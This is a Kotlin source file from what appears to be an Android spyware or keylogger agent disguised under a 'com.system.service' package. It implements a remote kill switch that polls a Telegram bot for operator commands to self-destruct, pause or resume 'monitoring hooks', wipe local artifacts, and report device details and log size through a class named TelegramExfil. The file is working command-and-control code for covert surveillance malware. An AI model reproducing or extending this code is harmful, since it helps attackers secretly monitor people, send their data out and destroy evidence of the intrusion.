package com.system.service.remote

import android.content.Context
import android.os.Build
import com.system.service.core.Config
import com.system.service.core.Storage
import com.system.service.exfil.TelegramExfil
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Remote Kill Switch — polls Telegram bot for commands.
 * Mirrors the desktop's killSwitch with identical commands:
 *   /kill     — self-destruct
 *   /pause    — suspend monitoring
 *   /resume   — resume monitoring
 *   /status   — report device info
 *   /wipe     — delete all local data
 */
class KillSwitch(
    private val token: String,
    private val chatId: String,
    private val onPause: () -> Unit,
    private val onResume: () -> Unit,
    private val onKill: () -> Unit,
    private val onWipe: () -> Unit,
    private val context: Context
) {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(35, TimeUnit.SECONDS) // Long polling
        .build()

    private val running = AtomicBoolean(false)
    private var lastUpdateId = 0
    private var thread: Thread? = null

    private val telegram = TelegramExfil(token, chatId)

    fun start() {
        if (token.isBlank() || chatId.isBlank()) return
        running.set(true)

        thread = Thread {
            // Initial delay (same as desktop — 30s)
            Thread.sleep(30_000)

            while (running.get()) {
                try {
                    poll()
                } catch (_: Exception) { }
                Thread.sleep(2_000) // Small gap between long polls
            }
        }.apply {
            isDaemon = true
            name = "KillSwitchPoller"
            start()
        }
    }

    fun stop() {
        running.set(false)
        thread?.interrupt()
    }

    private fun poll() {
        // Long-polling with 30s timeout (same as desktop)
        val url = "https://api.telegram.org/bot$token/getUpdates?offset=${lastUpdateId + 1}&timeout=30"

        val request = Request.Builder()
            .url(url)
            .build()

        val response = client.newCall(request).execute()
        val body = response.body?.string() ?: return
        response.close()

        val json = JSONObject(body)
        if (!json.optBoolean("ok", false)) return

        val results = json.optJSONArray("result") ?: return

        for (i in 0 until results.length()) {
            val update = results.getJSONObject(i)
            lastUpdateId = update.getInt("update_id")

            val message = update.optJSONObject("message") ?: continue
            val chat = message.optJSONObject("chat") ?: continue
            val msgChatId = chat.optLong("id", 0).toString()

            // Verify command comes from authorized chat
            if (msgChatId != chatId) continue

            val cmd = message.optString("text", "").trim().lowercase()

            when (cmd) {
                "/kill" -> {
                    telegram.sendResponse("🔴 *KILL SWITCH ACTIVATED*\n\nSelf-destructing in 5 seconds...")
                    Thread.sleep(5_000)
                    onKill()
                }

                "/pause", "/stop" -> {
                    telegram.sendResponse("⏸️ *Monitoring Paused*\n\nSend `/resume` to continue.")
                    onPause()
                }

                "/resume", "/start" -> {
                    telegram.sendResponse("▶️ *Monitoring Resumed*\n\nAll hooks re-activated.")
                    onResume()
                }

                "/status" -> {
                    val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
                    val androidVersion = "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})"
                    val logSize = Storage.getFileSize()
                    val logSizeStr = when {
                        logSize > 1048576 -> "${logSize / 1048576}MB"
                        logSize > 1024 -> "${logSize / 1024}KB"
                        else -> "${logSize}B"
                    }

                    telegram.sendResponse(
                        "🟢 *Agent Status*\n\n" +
                        "• Device: `$deviceModel`\n" +
                        "• OS: `$androidVersion`\n" +
                        "• Uptime: Active\n" +
                        "• Log Size: `$logSizeStr`\n" +
                        "• PID: `${android.os.Process.myPid()}`"
                    )
                }

                "/wipe" -> {
                    telegram.sendResponse("🧹 *Data Wipe Initiated*\n\nAll local artifacts purged.")
                    onWipe()
                }
            }
        }
    }
}
